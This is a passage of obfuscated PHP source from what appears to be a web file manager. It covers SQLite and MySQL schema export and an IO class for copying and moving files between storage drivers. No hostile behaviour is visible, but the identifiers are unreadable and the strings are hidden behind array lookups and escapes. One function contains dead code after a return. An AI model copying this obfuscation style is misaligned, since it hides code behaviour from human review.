str_replace(array($‰ğËåø [1137], $‰ğËåø [262], $‰ğËåø [418]), array($‰ğËåø [1138], $‰ğËåø [1139], $‰ğËåø [1140]), $Ì€¡œ£); $¼õ§‰¦[] = $Ì€¡œ£; } return $‰ğËåø [58] . implode($‰ğËåø [1141], $¼õ§‰¦) . $‰ğËåø [58]; } private function sqlDecode($îš½¨¢˜, $¤˜¡…Üã, $á©„üË¶ = '') { $”¡ñ’‚Å =& $_SERVER[‹è™Ü¸Ñ]; $îš½¨¢˜ = str_replace(array($”¡ñ’‚Å[1138], $”¡ñ’‚Å[1139], $”¡ñ’‚Å[1140]), array($”¡ñ’‚Å[1137], $”¡ñ’‚Å[262], $”¡ñ’‚Å[418]), $îš½¨¢˜); if ($¤˜¡…Üã == $”¡ñ’‚Å[13]) { $îš½¨¢˜ = str_ireplace($”¡ñ’‚Å[1142], $”¡ñ’‚Å[59], $îš½¨¢˜); $îš½¨¢˜ = stripslashes($îš½¨¢˜); } return preg_replace($”¡ñ’‚Å[1143], $”¡ñ’‚Å[12], $îš½¨¢˜); if ($¤˜¡…Üã == $”¡ñ’‚Å[13]) { return $á©„üË¶ != $”¡ñ’‚Å[1144] ? stripslashes($îš½¨¢˜) : $îš½¨¢˜; } if ($á©„üË¶ == $”¡ñ’‚Å[1144]) { $îš½¨¢˜ = str_replace($”¡ñ’‚Å[1145], $”¡ñ’‚Å[121], stripslashes($îš½¨¢˜)); } return $îš½¨¢˜; } public function getSqlFile($Ğ‘×Ùº÷ = '') { $å¨£ÂÅÊ =& $_SERVER[‹è™Ü¸Ñ]; $œÕüª = $this->dbType(!0); $íïçğÀ÷ = CONTROLLER_DIR . "\x69\156\x73\164\141\154\x6c\57\x64\x61\x74\x61\x2f{$œÕüª}\56\x73\x71\x6c"; $Àú­¢”´ = file_get_contents($íïçğÀ÷); $… ËÀà¶ = $å¨£ÂÅÊ[1146] . ($œÕüª == $å¨£ÂÅÊ[859] ? $å¨£ÂÅÊ[1147] : $å¨£ÂÅÊ[1148]) . $å¨£ÂÅÊ[1149]; preg_match_all($… ËÀà¶, $Àú­¢”´, $¸¥ÊêÔ“); $ÍÏºÈÑĞ = $¸¥ÊêÔ“[1]; $ÆÎ¹ˆ‹ı = $this->model()->db(); $óåË’ÌÈ = $ÆÎ¹ˆ‹ı->getTables(); $şä‡ƒ±£ = TEMP_FILES . $å¨£ÂÅÊ[1150] . date($å¨£ÂÅÊ[272]) . $å¨£ÂÅÊ[8]; del_dir($şä‡ƒ±£); mk_dir($şä‡ƒ±£); $Éşˆê¬¦ = $şä‡ƒ±£ . $å¨£ÂÅÊ[1151]; $šİœµ“ = $şä‡ƒ±£ . $å¨£ÂÅÊ[1152]; $Ê÷ˆ¡ª˜ = $œÕüª == $å¨£ÂÅÊ[13] ? $å¨£ÂÅÊ[859] : $å¨£ÂÅÊ[13]; IO::copy(CONTROLLER_DIR . "\151\x6e\163\x74\x61\154\154\57\x64\x61\164\141\x2f{$Ê÷ˆ¡ª˜}\56\163\161\154", $şä‡ƒ±£); @touch($şä‡ƒ±£ . $œÕüª . $å¨£ÂÅÊ[843]); $¥òºŒ²ú = fopen($Éşˆê¬¦, $å¨£ÂÅÊ[1125]); $‚âõ§éå = fopen($šİœµ“, $å¨£ÂÅÊ[1125]); if ($œÕüª == $å¨£ÂÅÊ[13]) { $óåË’ÌÈ = array_diff($óåË’ÌÈ, array($å¨£ÂÅÊ[835], $å¨£ÂÅÊ[836])); $…øÂŒë  = array($å¨£ÂÅÊ[1153], $å¨£ÂÅÊ[1154], $å¨£ÂÅÊ[1155]); fwrite($‚âõ§éå, implode(PHP_EOL, $…øÂŒë ) . PHP_EOL . PHP_EOL); foreach ($óåË’ÌÈ as $¼ê²âØ®) { $Âï³‡§˜ = $this->sqlFromSqlite($¼ê²âØ®); if (!$Âï³‡§˜[$å¨£ÂÅÊ[13]]) { continue; } fwrite($‚âõ§éå, $Âï³‡§˜[$å¨£ÂÅÊ[13]] . PHP_EOL . PHP_EOL); if (!in_array($¼ê²âØ®, $ÍÏºÈÑĞ)) { fwrite($¥òºŒ²ú, $Âï³‡§˜[$å¨£ÂÅÊ[859]] . PHP_EOL . PHP_EOL); } } } else { foreach ($óåË’ÌÈ as $¼ê²âØ®) { $Âï³‡§˜ = $this->sqlFromMysql($¼ê²âØ®); if (!$Âï³‡§˜[$å¨£ÂÅÊ[859]]) { continue; } fwrite($¥òºŒ²ú, $Âï³‡§˜[$å¨£ÂÅÊ[859]] . PHP_EOL . PHP_EOL); if (!in_array($¼ê²âØ®, $ÍÏºÈÑĞ)) { fwrite($‚âõ§éå, $Âï³‡§˜[$å¨£ÂÅÊ[13]] . PHP_EOL . PHP_EOL); } } } fclose($¥òºŒ²ú); fclose($‚âõ§éå); $Àú­¢”´ = array($å¨£ÂÅÊ[859] => $Éşˆê¬¦, $å¨£ÂÅÊ[13] => $šİœµ“); return $Ğ‘×Ùº÷ ? $Àú­¢”´[$Ğ‘×Ùº÷] : $Àú­¢”´; } public function dbType($±“¿™™ê = false) { $ç¯š›ğô =& $_SERVER[‹è™Ü¸Ñ]; $ùæŒŒÎò = $±“¿™™ê ? $GLOBALS[$ç¯š›ğô[6]][$ç¯š›ğô[21]] : $this->database; $ùæŒŒÎò = array_change_key_case($ùæŒŒÎò); $ëåó•Ï = $ùæŒŒÎò[$ç¯š›ğô[1025]]; if ($ëåó•Ï == $ç¯š›ğô[1022]) { $Ã‡óíş¢ = explode($ç¯š›ğô[4], $ùæŒŒÎò[$ç¯š›ğô[1031]]); $ëåó•Ï = $Ã‡óíş¢[0]; } $­õº•­á = array($ç¯š›ğô[1156] => $ç¯š›ğô[13], $ç¯š›ğô[970] => $ç¯š›ğô[859]); if (isset($­õº•­á[$ëåó•Ï])) { $ëåó•Ï = $­õº•­á[$ëåó•Ï]; } return $ëåó•Ï; } public function sqlFromMysql($İ’™÷ë¢, $×¯ØÄå” = '') { $´ñÁ•…„ =& $_SERVER[‹è™Ü¸Ñ]; $¨—Òî· = $this->model()->db(); $¿Æ™ÌœÍ = $¨—Òî·->query($´ñÁ•…„[1157] . $İ’™÷ë¢ . $´ñÁ•…„[461]); if (!$¿Æ™ÌœÍ || !$¿Æ™ÌœÍ[0]) { return !1; } $ÏØšÛ½ä = _get($¿Æ™ÌœÍ[0], $´ñÁ•…„[1158], $´ñÁ•…„[12]); if (!$ÏØšÛ½ä) { return !1; } $Ôãøş = "\104\122\117\120\x20\x54\101\102\114\x45\40\111\x46\40\105\x58\x49\123\x54\x53\x20\x60{$İ’™÷ë¢}\x60\x3b" . PHP_EOL . $ÏØšÛ½ä . $´ñÁ•…„[74]; if ($×¯ØÄå” && $×¯ØÄå” == $´ñÁ•…„[859]) { return $Ôãøş; } $™ëÌÀÏ‘ = array_change_key_case($GLOBALS[$´ñÁ•…„[6]][$´ñÁ•…„[21]]); $¹¦âÖ¨í = $™ëÌÀÏ‘[$´ñÁ•…„[1030]]; $è˜¸éË× = $´ñÁ•…„[1159] . $¹¦âÖ¨í . $´ñÁ•…„[1160] . $İ’™÷ë¢ . $´ñÁ•…„[58]; $‚Êô¡Û = $´ñÁ•…„[1161] . $İ’™÷ë¢ . $´ñÁ•…„[958]; $Ô·ÃÊ®ª = $¨—Òî·->query($è˜¸éË×); if (empty($Ô·ÃÊ®ª)) { $É…Ü…” = array($´ñÁ•…„[859] => $´ñÁ•…„[12], $´ñÁ•…„[13] => $´ñÁ•…„[12]); return $×¯ØÄå” ? $É…Ü…”[$×¯ØÄå”] : $É…Ü…”; } $¶â­Ú¦Ø = $¨—Òî·->query($‚Êô¡Û); $ç†Øö¡Ú = $´ñÁ•…„[12]; $Ñ¸Ä¥ë§ = array(); foreach ($¶â­Ú¦Ø as $ù™»Úƒ›) { if (!$ç†Øö¡Ú && $ù™»Úƒ›[$´ñÁ•…„[1162]] == $´ñÁ•…„[1163]) { $ç†Øö¡Ú = $ù™»Úƒ›[$´ñÁ•…„[1164]]; } if (isset($Ñ¸Ä¥ë§[$ù™»Úƒ›[$´ñÁ•…„[1162]]])) { $Ñ¸Ä¥ë§[$ù™»Úƒ›[$´ñÁ•…„[1162]]][$´ñÁ•…„[1165]][] = $ù™»Úƒ›[$´ñÁ•…„[1164]]; continue; } $Ñ¸Ä¥ë§[$ù™»Úƒ›[$´ñÁ•…„[1162]]] = array($´ñÁ•…„[1166] => $ù™»Úƒ›[$´ñÁ•…„[1162]], $´ñÁ•…„[1165] => array($ù™»Úƒ›[$´ñÁ•…„[1164]]), $´ñÁ•…„[1167] => $ù™»Úƒ›[$´ñÁ•…„[1168]] == $´ñÁ•…„[91] ? 0 : 1); } $Ì˜á³äÏ = array(); foreach ($Ñ¸Ä¥ë§ as $ù™»Úƒ›) { $æ²Â‘ÕÏ = $ù™»Úƒ›[$´ñÁ•…„[1166]] == $´ñÁ•…„[1163]; $’Ååƒå = array($´ñÁ•…„[1169], $ù™»Úƒ›[$´ñÁ•…„[1167]] == $´ñÁ•…„[91] && !$æ²Â‘ÕÏ ? $´ñÁ•…„[1170] : $´ñÁ•…„[12], $´ñÁ•…„[1171], $´ñÁ•…„[1172] . $İ’™÷ë¢ . $´ñÁ•…„[11] . ($æ²Â‘ÕÏ ? $´ñÁ•…„[1173] : $ù™»Úƒ›[$´ñÁ•…„[1166]]) . $´ñÁ•…„[121], $´ñÁ•…„[1174], $´ñÁ•…„[121] . $İ’™÷ë¢ . $´ñÁ•…„[121], $´ñÁ•…„[1175] . implode($´ñÁ•…„[1176], $ù™»Úƒ›[$´ñÁ•…„[1165]]) . $´ñÁ•…„[1177]); $Ì˜á³äÏ[] = implode($´ñÁ•…„[53], $’Ååƒå) . $´ñÁ•…„[74]; } $’ÙÊƒ—é = array(); $¬¨œšª = array($´ñÁ•…„[1178] => $´ñÁ•…„[1179], $´ñÁ•…„[1179] => $´ñÁ•…„[1179], $´ñÁ•…„[364] => $´ñÁ•…„[391], $´ñÁ•…„[363] => $´ñÁ•…„[391]); foreach ($Ô·ÃÊ®ª as $ù™»Úƒ›) { $’Ååƒå = array($´ñÁ•…„[121] . $ù™»Úƒ›[$´ñÁ•…„[1180]] . $´ñÁ•…„[121], isset($¬¨œšª[$ù™»Úƒ›[$´ñÁ•…„[1181]]]) ? $¬¨œšª[$ù™»Úƒ›[$´ñÁ•…„[1181]]] : $ù™»Úƒ›[$´ñÁ•…„[1182]], $ù™»Úƒ›[$´ñÁ•…„[1183]] == $´ñÁ•…„[956] ? $´ñÁ•…„[1184] : $´ñÁ•…„[1185], $ù™»Úƒ›[$´ñÁ•…„[1180]] == $ç†Øö¡Ú ? $´ñÁ•…„[1186] : $´ñÁ•…„[12], $ù™»Úƒ›[$´ñÁ•…„[1007]] ? strtoupper(str_replace($´ñÁ•…„[11], $´ñÁ•…„[12], $ù™»Úƒ›[$´ñÁ•…„[1007]])) : $´ñÁ•…„[12]); $’ÙÊƒ—é[] = trim(implode($´ñÁ•…„[53], $’Ååƒå)); } $ü…•ˆí“ = array($´ñÁ•…„[1187] . $İ’™÷ë¢ . $´ñÁ•…„[1188], $´ñÁ•…„[1189] . $İ’™÷ë¢ . $´ñÁ•…„[1190], implode($´ñÁ•…„[50] . PHP_EOL, $’ÙÊƒ—é), $´ñÁ•…„[1004]); $À¾¯”¯ = implode(PHP_EOL, array_merge($ü…•ˆí“, $Ì˜á³äÏ)); if ($×¯ØÄå” && $×¯ØÄå” == $´ñÁ•…„[13]) { return $À¾¯”¯; } $É…Ü…” = array($´ñÁ•…„[859] => $Ôãøş, $´ñÁ•…„[13] => $À¾¯”¯); return $×¯ØÄå” ? $É…Ü…”[$×¯ØÄå”] : $É…Ü…”; } public function sqlFromSqlite($ë±‰·òÒ, $äÅñÎ§ì = '') { $Õµ¯çäø =& $_SERVER[‹è™Ü¸Ñ]; $Ú¨‰·øŸ = $this->model()->db(); $ÈíóËò = "\x50\x52\x41\107\115\x41\x20\x54\101\x42\114\105\137\111\x4e\106\x4f\x20\50\x27{$ë±‰·òÒ}\x27\51"; $Ëì¶áú‹ = "\x53\x45\x4c\105\103\x54\40\52\40\106\122\117\115\x20\163\161\x6c\151\x74\145\137\155\x61\x73\164\145\x72\x20\127\110\105\122\x45\x20\x74\142\x6c\137\156\x61\x6d\x65\x20\x3d\40\47{$ë±‰·òÒ}\47"; $Ì­çÑÇ = $Ú¨‰·øŸ->query($ÈíóËò); if (empty($Ì­çÑÇ)) { $Ã¬ÈÌ©¶ = array($Õµ¯çäø[859] => $Õµ¯çäø[12], $Õµ¯çäø[13] => $Õµ¯çäø[12]); return $äÅñÎ§ì ? $Ã¬ÈÌ©¶[$äÅñÎ§ì] : $Ã¬ÈÌ©¶; } $¸Ë¡ÊĞ = $Ú¨‰·øŸ->query($Ëì¶áú‹); $«¾í¥ãÙ = $Â×éí¹ş = array(); foreach ($¸Ë¡ÊĞ as $ñ‘÷Ô³î) { if ($ñ‘÷Ô³î[$Õµ¯çäø[33]] == $Õµ¯çäø[356]) { $«¾í¥ãÙ[] = $ñ‘÷Ô³î[$Õµ¯çäø[1191]]; } else { $Â×éí¹ş[$ñ‘÷Ô³î[$Õµ¯çäø[32]]] = $ñ‘÷Ô³î[$Õµ¯çäø[1191]]; } } $à¦â–Ä‘ = array_merge(array($Õµ¯çäø[1187] . $ë±‰·òÒ . $Õµ¯çäø[121]), $«¾í¥ãÙ, array_values($Â×éí¹ş)); $à¦â–Ä‘ = implode($Õµ¯çäø[74] . PHP_EOL, $à¦â–Ä‘) . $Õµ¯çäø[74]; if ($äÅñÎ§ì && $äÅñÎ§ì == $Õµ¯çäø[13]) { return $à¦â–Ä‘; } $®”Íô™ˆ = array(); $ãÜ¾±ƒª = array($Õµ¯çäø[1179] => $Õµ¯çäø[1192], $Õµ¯çäø[391] => $Õµ¯çäø[1193]); $Û­ã±ÎŸ = $Õµ¯çäø[12]; foreach ($Ì­çÑÇ as $ñ‘÷Ô³î) { if ($ñ‘÷Ô³î[$Õµ¯çäø[57]] == $Õµ¯çäø[91]) { $Û­ã±ÎŸ = $ñ‘÷Ô³î[$Õµ¯çäø[32]]; } $Ï¬«’º¢ = array($Õµ¯çäø[461] . $ñ‘÷Ô³î[$Õµ¯çäø[32]] . $Õµ¯çäø[461], isset($ãÜ¾±ƒª[$ñ‘÷Ô³î[$Õµ¯çäø[33]]]) ? $ãÜ¾±ƒª[$ñ‘÷Ô³î[$Õµ¯çäø[33]]] : $ñ‘÷Ô³î[$Õµ¯çäø[33]], $ñ‘÷Ô³î[$Õµ¯çäø[35]] == $Õµ¯çäø[91] ? $Õµ¯çäø[1184] : $Õµ¯çäø[1194] . $ñ‘÷Ô³î[$Õµ¯çäø[56]], $ñ‘÷Ô³î[$Õµ¯çäø[57]] == $Õµ¯çäø[91] ? $Õµ¯çäø[1195] : $Õµ¯çäø[12]); $®”Íô™ˆ[] = trim(implode($Õµ¯çäø[53], $Ï¬«’º¢)); } foreach ($Â×éí¹ş as $ê¢£ñÉâ => $Ä¨ª’ˆõ) { $­µîİˆÎ = str_replace($Õµ¯çäø[1196] . $ë±‰·òÒ . $Õµ¯çäø[11], $Õµ¯çäø[12], $ê¢£ñÉâ); $ºÁÂş…ó = str_replace(array($Õµ¯çäø[121], $Õµ¯çäø[1015]), $Õµ¯çäø[461], substr($Ä¨ª’ˆõ, stripos($Ä¨ª’ˆõ, $Õµ¯çäø[337]))); if ($­µîİˆÎ == $Õµ¯çäø[1173]) { $“ËØÀ¹™ = $Õµ¯çäø[1197] . $Û­ã±ÎŸ . $Õµ¯çäø[1198]; } else { $“ËØÀ¹™ = (stripos($­µîİˆÎ, $Õµ¯çäø[11]) ? $Õµ¯çäø[1199] : $Õµ¯çäø[12]) . ($Õµ¯çäø[1200] . $­µîİˆÎ . $Õµ¯çäø[1201] . $ºÁÂş…ó); } $®”Íô™ˆ[] = $“ËØÀ¹™; } $Ì“¬¼© = array($Õµ¯çäø[1202] . $ë±‰·òÒ . $Õµ¯çäø[1203], $Õµ¯çäø[1204] . $ë±‰·òÒ . $Õµ¯çäø[1205], implode($Õµ¯çäø[50] . PHP_EOL, $®”Íô™ˆ), $Õµ¯çäø[1206]); $ø”İªº¾ = implode(PHP_EOL, $Ì“¬¼©); if ($äÅñÎ§ì && $äÅñÎ§ì == $Õµ¯çäø[859]) { return $ø”İªº¾; } $Ã¬ÈÌ©¶ = array($Õµ¯çäø[859] => $ø”İªº¾, $Õµ¯çäø[13] => $à¦â–Ä‘); return $äÅñÎ§ì ? $Ã¬ÈÌ©¶[$äÅñÎ§ì] : $Ã¬ÈÌ©¶; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($˜Î²›’İ, $Î•Ç½“ê) { $ª•ñ›Ğ› =& $_SERVER[‹è™Ü¸Ñ]; $Ã™ú“µç = $Î•Ç½“ê; $GLOBALS[$ª•ñ›Ğ›[1207]] = $ª•ñ›Ğ›[1208] . $˜Î²›’İ; Hook::trigger($ª•ñ›Ğ›[1208] . $˜Î²›’İ . $ª•ñ›Ğ›[1209], $Ã™ú“µç); $’Ô€Áû = self::driverMake($Î•Ç½“ê[0]); if (!$’Ô€Áû) { return !1; } if (method_exists($’Ô€Áû, $˜Î²›’İ)) { $¡îöæõ² = @call_user_func_array(array($’Ô€Áû, $˜Î²›’İ), $Î•Ç½“ê); } else { if (method_exists($’Ô€Áû, $ª•ñ›Ğ›[1210])) { $¡îöæõ² = @call_user_func_array(array($’Ô€Áû, $˜Î²›’İ), $Î•Ç½“ê); } else { if (method_exists(self, $˜Î²›’İ)) { $¡îöæõ² = @call_user_func_array(array(self, $˜Î²›’İ), $Î•Ç½“ê); } else { $¡îöæõ² = call_user_func_array(array(parent, $˜Î²›’İ), $Î•Ç½“ê); } } } Hook::trigger($ª•ñ›Ğ›[1208] . $˜Î²›’İ . $ª•ñ›Ğ›[1211], $Ã™ú“µç, $¡îöæõ²); return $¡îöæõ²; } public static function init($üÕ¬€Ùß) { return self::driverMake($üÕ¬€Ùß); } public static function copy($Æ˜áø™Ö, $“óş—Åñ, $…ì»²©Ş = false, $ÅÃıŠ¬ = false) { return self::copyMoveStart($Æ˜áø™Ö, $“óş—Åñ, $…ì»²©Ş, $_SERVER[‹è™Ü¸Ñ][618], $ÅÃıŠ¬); } public static function move($ÓââÎ, $†à·İæ¤, $œ÷•ğú˜ = false, $À¶­Âü® = false) { return self::copyMoveStart($ÓââÎ, $†à·İæ¤, $œ÷•ğú˜, $_SERVER[‹è™Ü¸Ñ][620], $À¶­Âü®); } private static function copyMoveStart($æÙªıø¨, $ãÜ­¼é¯, $õÆ±¸²Õ, $³å…äæ, $Ğ¢²İ†±) { $ã±ô“Şè =& $_SERVER[‹è™Ü¸Ñ]; $£õ÷£äÄ = array($æÙªıø¨, $ãÜ­¼é¯, $õÆ±¸²Õ, $Ğ¢²İ†±); Hook::trigger($ã±ô“Şè[1208] . $³å…äæ . $ã±ô“Şè[1209], $£õ÷£äÄ); $åÜÚ·ø‘ = self::copyMove($æÙªıø¨, $ãÜ­¼é¯, $õÆ±¸²Õ, $³å…äæ, $Ğ¢²İ†±); Hook::trigger($ã±ô“Şè[1208] . $³å…äæ . $ã±ô“Şè[1211], $£õ÷£äÄ, $åÜÚ·ø‘); return $åÜÚ·ø‘; } public static function saveFile($‰ÊÎ¢‰¬, $¥¬Ÿ±ÜÊ, $Şœ©â™ñ = true) { $ˆÔŒŠª¾ =& $_SERVER[‹è™Ü¸Ñ]; $¹ûü£İ¢ = self::info($¥¬Ÿ±ÜÊ); $ëÛ®µ˜™ = self::driverMake($‰ÊÎ¢‰¬); $Úï­©¹Ÿ = self::driverMake($¥¬Ÿ±ÜÊ); $Ø¹óÇÉ = !1; if ($Úï­©¹Ÿ->pathParse[$ˆÔŒŠª¾[1212]]) { $Ø¹óÇÉ = $Úï­©¹Ÿ; $ Ë‡İÎ” = $Úï­©¹Ÿ->pathParse[$ˆÔŒŠª¾[1212]]; $Úï­©¹Ÿ = self::driverMake($ Ë‡İÎ”); } if ($ëÛ®µ˜™->pathParse[$ˆÔŒŠª¾[1212]]) { $·÷ã²±æ = $ëÛ®µ˜™->pathParse[$ˆÔŒŠª¾[1212]]; $ëÛ®µ˜™ = self::driverMake($·÷ã²±æ); } $Ò‰Ô§®Ş = $Úï­©¹Ÿ->pathFather($¥¬Ÿ±ÜÊ); $¯¯ÙŞ = !0; if (!$Şœ©â™ñ && self::driverIsSame($ëÛ®µ˜™, $Úï­©¹Ÿ)) { $¯¯ÙŞ = !1; } $°—Û¯²‚ = self::copyFile($ëÛ®µ˜™, $‰ÊÎ¢‰¬, $Úï­©¹Ÿ, $Ò‰Ô§®Ş, $¹ûü£İ¢[$ˆÔŒŠª¾[32]], $¯¯ÙŞ); if ($Ø¹óÇÉ) { $°—Û¯²‚ = $Ø¹óÇÉ->getPathOuter($°—Û¯²‚); } return $°—Û¯²‚; } private static function copyMove($ÃˆÄéè±, $ıµÖßîÜ, $Ç‡¾ƒ¯Ò, $¬¶ÜÏş, $£‹Ÿû‰Ø = false) { $£òúõ• =& $_SERVER[‹è™Ü¸Ñ]; if (!$ÃˆÄéè± || $ÃˆÄéè± == $£òúõ•[8] || !$ıµÖßîÜ) { return !1; } ignore_timeout(); $Øó–„©ô = self::driverMake($ÃˆÄéè±); $ÈÈ¼ÒÂò = self::driverMake($ıµÖßîÜ); $šÓ’ı÷¦ = $¬¶ÜÏş == $£òúõ•[620]; $Ğ–û³Ï© = !1; if ($ÈÈ¼ÒÂò->pathParse[$£òúõ•[1212]]) { $Ğ–û³Ï© = $ÈÈ¼ÒÂò; $ıµÖßîÜ = $ÈÈ¼ÒÂò->pathParse[$£òúõ•[1212]]; $ÈÈ¼ÒÂò = self::driverMake($ıµÖßîÜ); } if ($Øó–„©ô->pathParse[$£òúõ•[1212]]) { $ÃˆÄéè± = $Øó–„©ô->pathParse[$£òúõ•[1212]]; $Øó–„©ô = self::driverMake($ÃˆÄéè±); } self::check($Øó–„©ô, $ÃˆÄéè±, $ÈÈ¼ÒÂò, $ıµÖßîÜ); Hook::trigger($£òúõ•[1213], $Øó–„©ô, $ÃˆÄéè±, $ÈÈ¼ÒÂò, $ıµÖßîÜ); $Ó¶ºÑ = self::driverIsSame($Øó–„©ô, $ÈÈ¼ÒÂò); if ($Ó¶ºÑ) { if ($¬¶ÜÏş == $£òúõ•[620] && !method_exists($ÈÈ¼ÒÂò, $£òúõ•[1214]) && trim($ıµÖßîÜ, $£òúõ•[8]) == trim($ÈÈ¼ÒÂò->pathFather($ÃˆÄéè±), $£òúõ•[8])) { if ($Øó–„©ô->pathThis($ÃˆÄéè±) != $£‹Ÿû‰Ø && !$Øó–„©ô->isOsDriver()) { return $Øó–„©ô->rename($ÃˆÄéè±, $£‹Ÿû‰Ø); } return $ÈÈ¼ÒÂò->getPathOuter($ÃˆÄéè±); } if (method_exists($ÈÈ¼ÒÂò, $¬¶ÜÏş)) { return $ÈÈ¼ÒÂò->{$¬¶ÜÏş}($ÃˆÄéè±, $ıµÖßîÜ, $Ç‡¾ƒ¯Ò, $£‹Ÿû‰Ø); } } if ($Ó¶ºÑ && $¬¶ÜÏş == $£òúõ•[620] && $ÈÈ¼ÒÂò->getType() == $£òúõ•[109]) { $õ¥½œ = $ÈÈ¼ÒÂò->movePath($ÃˆÄéè±, $ıµÖßîÜ, $£‹Ÿû‰Ø); if ($õ¥½œ) { return $õ¥½œ; } } $õ‰Ší‹Ô = $Øó–„©ô->isFile($ÃˆÄéè±); if (!$õ‰Ší‹Ô && $ÈÈ¼ÒÂò->getType() == $£òúõ•[812] && $Øó–„©ô->getType() == $£òúõ•[109]) { $õ¥½œ = $ÈÈ¼ÒÂò->copyFolderFromIO($Øó–„©ô, $ÃˆÄéè±, $ıµÖßîÜ, $Ç‡¾ƒ¯Ò, $šÓ’ı÷¦, $£‹Ÿû‰Ø); } else { $õ¥½œ = self::copyPath($Øó–„©ô, $ÃˆÄéè±, $ÈÈ¼ÒÂò, $ıµÖßîÜ, $Ç‡¾ƒ¯Ò, $šÓ’ı÷¦, $õ‰Ší‹Ô, $£‹Ÿû‰Ø); } if ($õ¥½œ && $šÓ’ı÷¦) { $Øó–„©ô->remove($ÃˆÄéè±); } if ($Ğ–û³Ï©) { $õ¥½œ = $Ğ–û³Ï©->getPathOuter($õ¥½œ); } return $õ¥½œ; } private static function check($¸¼ÜÉì, $„û‹ÔŠ¿, $íœ´¢™ğ, &$Íá®—•¹) { $¹«‘“‰ =& $_SERVER[‹è™Ü¸Ñ]; if (self::driverIsSame($¸¼ÜÉì, $íœ´¢™ğ) && $¸¼ÜÉì->isFolder($„û‹ÔŠ¿) && $¸¼ÜÉì->isParentOf($„û‹ÔŠ¿, $Íá®—•¹)) { show_json(LNG($¹«‘“‰[1215]), !1); } if (!$¸¼ÜÉì->exist($„û‹ÔŠ¿)) { show_json(LNG($¹«‘“‰[108]), !1); } } private static function copyPath($¢Á—¤®ê, $•šÔê‰«, $˜ Ã¦Ø÷, $ÇŒİÉ‘Œ, $•îÕ´Áê, $ÓÓİŒÃ, $ä‘ª¨À±, $¸¹şßŒ‡ = false, $ÑÆŠÄà× = true) { $ÓûªÖ¯ =& $_SERVER[‹è™Ü¸Ñ]; $ÏŸæ = empty($¸¹şßŒ‡) && $¸¹şßŒ‡ !== $ÓûªÖ¯[228] ? $¢Á—¤®ê->pathThis($•šÔê‰«) : $¸¹şßŒ‡; if ($•îÕ´Áê) { $Òı•¯Ğ‘ = $˜ Ã¦Ø÷->fileNameExist($ÇŒİÉ‘Œ, $ÏŸæ); $˜õõ¯¿Í = $ÏŸæ; $ÏŸæ = $˜ Ã¦Ø÷->fileNameAuto($ÇŒİÉ‘Œ, $ÏŸæ, $•îÕ´Áê, !$ä‘ª¨À±); if (!$Òı•¯Ğ‘ || $˜õõ¯¿Í != $ÏŸæ) { $•îÕ´Áê = !1; } if ($ÑÆŠÄà× && !$•îÕ´Áê) { $˜ Ã¦Ø÷->_data[$ÓûªÖ¯[1216]] = !0; } } if ($ä‘ª¨À±) { return self::copyFile($¢Á—¤®ê, $•šÔê‰«, $˜ Ã¦Ø÷, $ÇŒİÉ‘Œ, $ÏŸæ, $ÓÓİŒÃ); } if ($•îÕ´Áê == REPEAT_RENAME_FOLDER) { $•îÕ´Áê = !1; } $Ë¶‹óı = rtrim($ÇŒİÉ‘Œ, $ÓûªÖ¯[8]) . $ÓûªÖ¯[8] . $ÏŸæ; $š¬í³ñ = $˜ Ã¦Ø÷->mkdir($˜ Ã¦Ø÷->getPath($Ë¶‹óı), $•îÕ´Áê); $ÇŒİÉ‘Œ = $˜ Ã¦Ø÷->getPathInner($š¬í³ñ); $†ØêÔª = $¢Á—¤®ê->listPath($•šÔê‰«, !0); $†ØêÔª = is_array($†ØêÔª) ? $†ØêÔª : array($ÓûªÖ¯[86] => array(), $ÓûªÖ¯[85] => array()); $ô„„¿ÖÚ = array_merge($†ØêÔª[$ÓûªÖ¯[86]], $†ØêÔª[$ÓûªÖ¯[85]]); foreach ($ô„„¿ÖÚ as $û†ß¢“) { $ØÊó˜‰à = $û†ß¢“[$ÓûªÖ¯[33]] == $ÓûªÖ¯[230]; $•šÔê‰« = $¢Á—¤®ê->getPathInner($û†ß¢“[$ÓûªÖ¯[87]]); $Œã½‹°ñ = self::copyPath($¢Á—¤®ê, $•šÔê‰«, $˜ Ã¦Ø÷, $ÇŒİÉ‘Œ, $•îÕ´Áê, $ÓÓİŒÃ, $ØÊó˜‰à, !1, !1); if (!$Œã½‹°ñ) { IO::errorTips($ÓûªÖ¯[1217] . $•šÔê‰« . $ÓûªÖ¯[73] . $ÇŒİÉ‘Œ); } } self::copyMoveKeepInfo($¢Á—¤®ê, $•šÔê‰«, $š¬í³ñ); return $š¬í³ñ; } private static function copyFile($¦–¼œÉï, $ëú®£æœ, $î®ñû§ø, $–¸´°Ñë, $ğçîï», $“©•Úø½) { $¾ğ”£Ä =& $_SERVER[‹è™Ü¸Ñ]; $–¸´°Ñë = $î®ñû§ø->getPath(rtrim($–¸´°Ñë, $¾ğ”£Ä[8]) . $¾ğ”£Ä[8] . $ğçîï»); $ª—ñï¨‰ = $¾ğ”£Ä[1218] . time() . rand_string(5); Hook::trigger($¾ğ”£Ä[1219], $¦–¼œÉï, $ëú®£æœ, $î®ñû§ø, $–¸´°Ñë, $ğçîï», $ª—ñï¨‰); if (self::driverIsSame($¦–¼œÉï, $î®ñû§ø)) { if ($“©•Úø½) { $Š²¸ªŸ£ = $î®ñû§ø->moveFile($ëú®£æœ, $–¸´°Ñë); } else { $Š²¸ªŸ£ = $î®ñû§ø->copyFile($ëú®£æœ, $–¸´°Ñë); } Hook::trigger($¾ğ”£Ä[1220], $¦–¼œÉï, $ëú®£æœ, $î®ñû§ø, $–¸´°Ñë, $ğçîï», $Š²¸ªŸ£); self::copyMoveKeepInfo($¦–¼œÉï, $ëú®£æœ, $Š²¸ªŸ£); return $Š²¸ªŸ£; } $Â¬ÇÕæ¯ = TEMP_FILES; if ($GLOBALS[$¾ğ”£Ä[6]][$¾ğ”£Ä[92]][$¾ğ”£Ä[851]]) { $Â¬ÇÕæ¯ = $GLOBALS[$¾ğ”£Ä[6]][$¾ğ”£Ä[92]][$¾ğ”£Ä[851]]; } $¨ãÑ¥”Ô = $Â¬ÇÕæ¯; mk_dir($¨ãÑ¥”Ô); $®ªé‡¢ê = $¨ãÑ¥”Ô . $ª—ñï¨‰; $’‹ÌÇã = $®ªé‡¢ê; $®ªé‡¢ê = $¦–¼œÉï->download($ëú®£æœ, $®ªé‡¢ê); $®ªé‡¢ê = $¦–¼œÉï->iconvApp($®ªé‡¢ê); if (substr($®ªé‡¢ê, 